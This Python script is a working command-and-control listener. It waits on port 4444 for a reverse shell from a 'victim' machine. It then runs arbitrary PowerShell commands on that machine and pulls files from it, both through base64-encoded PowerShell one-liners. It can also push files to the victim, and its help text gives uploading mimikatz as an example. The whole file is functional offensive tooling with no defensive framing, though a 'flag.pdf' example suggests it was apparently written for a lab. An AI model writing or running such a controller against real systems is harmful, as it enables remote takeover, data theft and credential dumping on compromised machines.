#!/usr/bin/env python3
import socket
import base64
import sys
import threading
import re

class C2Listener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.conn = None
        self.addr = None
        self.running = True
        
    def start(self):
        """Start the listener"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(1)
        
        print(f"[*] Listening on {self.host}:{self.port}")
        print("[*] Waiting for connection...")
        
        self.conn, self.addr = server.accept()
        print(f"[+] Connection established from {self.addr[0]}:{self.addr[1]}")
        print("[*] Type 'help' for commands\n")
        
        # Start receive thread
        receive_thread = threading.Thread(target=self.receive_data)
        receive_thread.daemon = True
        receive_thread.start()
        
        # Main command loop
        self.command_loop()
        
    def receive_data(self):
        """Continuously receive and process data from victim"""
        buffer = ""
        receiving_file = False
        file_b64 = ""
        file_name = ""
        
        while self.running:
            try:
                data = self.conn.recv(65536).decode('utf-8', errors='ignore')
                if not data:
                    print("\n[-] Connection closed by victim")
                    self.running = False
                    break
                
                buffer += data
                
                # Check for file transfer
                if "FILE_START|" in buffer:
                    receiving_file = True
                    # Extract filename
                    match = re.search(r'FILE_START\|(.+?)\|', buffer)
                    if match:
                        file_name = match.group(1).split('\\')[-1]
                        print(f"\n[*] Receiving file: {file_name}")
                    # Clean buffer
                    buffer = buffer.split('\n', 1)[1] if '\n' in buffer else ""
                    file_b64 = ""
                    
                elif receiving_file and "FILE_END" in buffer:
                    file_b64 += buffer.split('FILE_END')[0]
                    try:
                        file_data = base64.b64decode(file_b64)
                        with open(f"downloaded_{file_name}", "wb") as f:
                            f.write(file_data)
                        print(f"\n[+] File saved as: downloaded_{file_name}")
                    except Exception as e:
                        print(f"\n[-] Failed to decode file: {e}")
                    receiving_file = False
                    file_b64 = ""
                    buffer = ""
                    
                elif receiving_file:
                    file_b64 += buffer
                    buffer = ""
                    
                elif buffer.strip():
                    # Print command output
                    print(buffer, end='')
                    buffer = ""
                    
            except Exception as e:
                if self.running:
                    print(f"\n[-] Receive error: {e}")
                break
                
    def send_command(self, cmd):
        """Send command to victim"""
        try:
            self.conn.send((cmd + "\n").encode('utf-8'))
            return True
        except:
            return False
            
    def upload_file(self, local_path, remote_path):
        """Upload a file from attacker to victim"""
        try:
            with open(local_path, 'rb') as f:
                file_data = f.read()
            b64_data = base64.b64encode(file_data).decode('utf-8')
            
            # Fix: Use double backslashes or forward slashes for Windows paths
            remote_path_fixed = remote_path.replace('\\', '\\\\')
            
            # Send command to receive and save file
            cmd = f'$b64="{b64_data}"; $bytes=[Convert]::FromBase64String($b64); [IO.File]::WriteAllBytes("{remote_path_fixed}", $bytes)'
            self.send_command(cmd)
            print(f"[*] Uploading {local_path} to {remote_path}")
            return True
        except Exception as e:
            print(f"[-] Upload failed: {e}")
            return False
            
    def download_file(self, remote_path):
        """Download file from victim to attacker"""
        # Fix: Use double backslashes or forward slashes for Windows paths
        remote_path_fixed = remote_path.replace('\\', '\\\\')
        
        # Send command to read and base64 encode file
        cmd = f'$path="{remote_path_fixed}"; if(Test-Path $path){{$bytes=[IO.File]::ReadAllBytes($path); $b64=[Convert]::ToBase64String($bytes); Write-Host "FILE_START|$path|$($bytes.Length)"; Write-Host $b64; Write-Host "FILE_END"}} else{{Write-Host "ERROR|File not found: $path"}}'
        self.send_command(cmd)
        print(f"[*] Requesting {remote_path}...")
        
    def command_loop(self):
        """Interactive command loop"""
        while self.running:
            try:
                cmd = input("> ").strip()
                
                if not cmd:
                    continue
                    
                if cmd == "exit":
                    print("[*] Closing connection")
                    self.running = False
                    break
                    
                elif cmd == "help":
                    self.show_help()
                    
                elif cmd.startswith("upload "):
                    parts = cmd.split()
                    if len(parts) == 3:
                        _, local, remote = parts
                        self.upload_file(local, remote)
                    elif len(parts) == 2:
                        _, local = parts
                        self.upload_file(local, local)
                    else:
                        print("Usage: upload local_file [remote_path]")
                        
                elif cmd.startswith("download "):
                    parts = cmd.split()
                    if len(parts) == 2:
                        _, remote = parts
                        self.download_file(remote)
                    else:
                        print("Usage: download remote_file")
                        
                else:
                    # Send as normal PowerShell command
                    self.send_command(cmd)
                    
            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                break
            except EOFError:
                break
                
    def show_help(self):
        """Display help menu"""
        help_text = """
=== C2 Listener Commands ===

  help                    - Show this menu
  exit                    - Close connection and exit
  
  download C:\\path\\to\\file - Download file from victim
  upload local.exe C:\\remote.exe - Upload file to victim
  
  Any other command       - Execute in PowerShell on victim

Examples:
  > whoami
  > dir C:\\Users
  > download C:\\Users\\Victim\\Desktop\\flag.pdf
  > upload mimikatz.exe C:\\temp\\mimikatz.exe
  > Get-Process
  
File transfers are automatic! Downloaded files save as downloaded_<filename>
"""
        print(help_text)

if __name__ == "__main__":
    listener = C2Listener(host='0.0.0.0', port=4444)
    listener.start()